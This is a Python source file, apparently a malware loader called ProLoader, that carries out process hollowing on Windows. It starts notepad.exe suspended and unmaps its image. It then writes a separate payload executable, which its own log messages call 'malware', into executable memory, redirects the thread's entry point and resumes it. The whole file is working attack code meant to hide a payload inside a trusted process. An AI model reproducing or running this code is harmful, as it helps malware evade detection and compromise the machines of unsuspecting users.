from WinDef import *
from ctypes import *
from ctypes.wintypes import *
import pefile
from pefile import Structure
import sys
import logging

logger = logging.getLogger(__name__)
logging.basicConfig(
    format="[%(asctime)s] %(levelname)s: %(message)s",
    level=logging.DEBUG,
    datefmt="%Y-%m-%d %H:%M:%S")

class ProLoader:

    PAYLOAD_EXE = r"dist\\ProvigilPy\\ProvigilPy.exe"
    TARGET = r"C:\Windows\notepad.exe"
    startup_info = StartupInfo()
    process_info = ProcessInfo()
    context = Context64()

    def loading_provigil_process(self):
        logger.info("[*] Load Replacement Executable")

        logger.info("\tOpen provigil executable")
        hReplacement = HANDLE()
        hReplacement = windll.kernel32.CreateFileW(
        self.PAYLOAD_EXE,
        GENERIC_READ,
        FILE_SHARE_READ,
        0,
        OPEN_EXISTING,
        0,
        0)
        if (hReplacement == -1):
            logger.error(f"\tCreateFile error: {FormatError(GetLastError())}")
            sys.exit(1)

        logger.info(f"\tAllocating memory for malware")
        allocated_address = LPVOID()
        file_size = windll.kernel32.GetFileSize(hReplacement, 0)
        windll.kernel32.VirtualAlloc.restype = LPVOID
        logger.debug(f"\tSize of {self.PAYLOAD_EXE}: {file_size}")
        allocated_address = windll.kernel32.VirtualAlloc(
            0,
            file_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
        if allocated_address == 0:
            logger.error(f"\tVirtualAlloc error: {FormatError(GetLastError())}")
            sys.exit(1)

        logger.info("\tReading provigil executable")
        totalNumberofBytesRead = DWORD()
        if windll.kernel32.ReadFile(
            hReplacement, 
            LPVOID(allocated_address), 
            file_size, 
            byref(totalNumberofBytesRead), 
            0) == 0:
            logger.error(f"\tError when Reading malware: {FormatError(GetLastError())}")
            sys.exit(1)
        windll.kernel32.CloseHandle(hReplacement)
        logger.debug(f"\tMalware loaded in adress: {hex(allocated_address)}\n")
        return allocated_address



    def create_target_process(self):
        logger.info(f"[*] Create victim process : {self.TARGET}")

        logger.info(f"\tStarting {self.TARGET} in suspended state")
        if windll.kernel32.CreateProcessA(
                    None,
                    create_string_buffer(bytes(self.TARGET, encoding="ascii")),
                    None,
                    None,
                    False,
                    CREATE_SUSPENDED,
                    None,
                    None,
                    byref(self.startup_info),
                    byref(self.process_info),
        ) == 0:
            logger.error(f"\tCreateProcess {self.TARGET} error: {FormatError(GetLastError())}")
            sys.exit(1)
        logger.debug(f"\tPID: {self.process_info.dwProcessId}\n")



    def get_target_process_address(self):
        logger.info(f"[*] Get victim process address")

        logger.info("\tGetting thread {self.TARGET_EXE} context")
        
        self.context.ContextFlags = CONTEXT_FULL
        if windll.kernel32.GetThreadContext(self.process_info.hThread, byref(self.context)) == 0:
            logger.error(f"\tError in GetThreadContext: {FormatError(GetLastError())}")
            sys.exit(1)
        logger.debug(f"\tThread ID : {self.process_info.dwThreadId}")
        logger.debug(f"\tPeb address (Rdx register): {hex(self.context.Rdx + 16)}")

        logger.info(f"\tReading base address of target process {self.TARGET}")
        target_image_base = LPVOID()
        if windll.kernel32.ReadProcessMemory(
                self.process_info.hProcess,
                LPCVOID(self.context.Rdx + 16),
                byref(target_image_base),
                8,
                None
        ) == 0:
            logger.error(f"\tError in ReadProcessMemory: {FormatError(GetLastError())}")
            sys.exit(1)
        logger.debug(f"\tBase address of {self.TARGET} process: {hex(target_image_base.value)}\n")
        return target_image_base



    def hollow_out_memory(self, target_image_base):
        logger.info(f"[*] Unmap {self.TARGET} image at {hex(target_image_base.value)}\n")
        if windll.ntdll.NtUnmapViewOfSection(self.process_info.hProcess, target_image_base) == STATUS_ACCESS_DENIED:
            logger.error(f"Error in NtUnmapViewOfSection: {FormatError(GetLastError())}")
            sys.exit(1)



    def PE_parsing(self):
        logger.info(f"[*] Parsing {self.PAYLOAD_EXE}")
        provigil_pe = pefile.PE(self.PAYLOAD_EXE)
        with open(self.PAYLOAD_EXE, "rb") as h_payload:
            provigil_data = h_payload.read()
        logger.debug(f"\tMalware ImageBase : {hex(provigil_pe.OPTIONAL_HEADER.ImageBase)}")
        logger.debug(f"\tMalware EntryPoint : {hex(provigil_pe.OPTIONAL_HEADER.AddressOfEntryPoint)}\n")
        return (provigil_pe, provigil_data)


    def allocate_memory_in_target(self, provigil_pe_info, target_image_base):
        logger.info(f"[*] Allocating memory in {self.TARGET} process at address {hex(target_image_base.value)}")
        windll.kernel32.VirtualAllocEx.restype = LPVOID
        hollowed_allocated_address = windll.kernel32.VirtualAllocEx(
            self.process_info.hProcess,
            LPVOID(target_image_base.value),
            provigil_pe_info[0].OPTIONAL_HEADER.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
        if hollowed_allocated_address == 0:
            logger.error(f"\tError in VirtualAllocEx: {FormatError(GetLastError())}")
            sys.exit(1)
        logger.debug(f"\tAllocated memory at {hex(hollowed_allocated_address)}\n")
        return hollowed_allocated_address



    def inject_code(self, target_image_base, payload_allocated_adress, hollowed_allocated_address, provigil_pe_info):
        logger.info(f"[*] Inject code to {self.TARGET}")

        logger.info(f"\tWrite payload headers to target process (to {hex(target_image_base.value)})")
        if windll.kernel32.WriteProcessMemory(
                    self.process_info.hProcess,
                    LPVOID(target_image_base.value),
                    LPCVOID(payload_allocated_adress),
                    provigil_pe_info[0].OPTIONAL_HEADER.SizeOfHeaders,
                    None,
        ) == 0:
            logger.error(f"\tWriteProcessMemory error: {FormatError(GetLastError())}")
            sys.exit(1)

        logger.info("\tWrite payload sections to target process")
        for section in provigil_pe_info[0].sections:
            section_name = section.Name.decode("utf-8").strip("\x00")
            logger.info(f"\tWriting section {section_name} (to {hex(hollowed_allocated_address + section.VirtualAddress)})")
            if windll.kernel32.WriteProcessMemory(
                    self.process_info.hProcess,
                    LPVOID(hollowed_allocated_address + section.VirtualAddress),
                    provigil_pe_info[1][section.PointerToRawData:],
                    section.SizeOfRawData,
                    0,
            ) == 0:
                logger.error(f"\tWriteProcessMemory error: {FormatError(GetLastError())}")
                sys.exit(1)



    def restart_process(self, hollowed_allocated_address, provigil_pe_info):
        print("")
        logger.info(f"[*] Restarting {self.TARGET}")

        logger.info("\tSetting new entrypoint")
        self.context.Rcx = hollowed_allocated_address + provigil_pe_info[0].OPTIONAL_HEADER.AddressOfEntryPoint
        logger.debug(f"\tNew entrypoint: {hex(self.context.Rcx)}")
    
        logger.info("\tWrite payload base address within process")
        if windll.kernel32.WriteProcessMemory(
                self.process_info.hProcess,
                LPVOID(self.context.Rdx + 16),
                provigil_pe_info[1][provigil_pe_info[0].OPTIONAL_HEADER.get_field_absolute_offset("ImageBase"):],
                sizeof(LPVOID),
                None,
        ) == 0:
            logger.error(f"\tWriteProcessMemory error: {FormatError(GetLastError())}")
            sys.exit(1)

        logger.info("\tSet modified context")
        if windll.kernel32.SetThreadContext(self.process_info.hThread, byref(self.context)) == 0:
            logger.error(f"\tSetThreadContext error: {FormatError(GetLastError())}")
            sys.exit(1)

        logger.info("\tResuming context")
        if windll.kernel32.ResumeThread(self.process_info.hThread) == 0:
            logger.error(f"\tResumeThread error: {FormatError(GetLastError())}")
            sys.exit(1)


def main():
    loader = ProLoader()
    payload_allocated_address = loader.loading_provigil_process()
    loader.create_target_process()
    target_image_base = loader.get_target_process_address()
    loader.hollow_out_memory(target_image_base)
    provigil_pe_info = loader.PE_parsing()
    hollowed_allocated_address = loader.allocate_memory_in_target(provigil_pe_info, target_image_base)
    loader.inject_code(target_image_base, payload_allocated_address, hollowed_allocated_address, provigil_pe_info)
    loader.restart_process(hollowed_allocated_address, provigil_pe_info)

if __name__ == '__main__':
    main()
    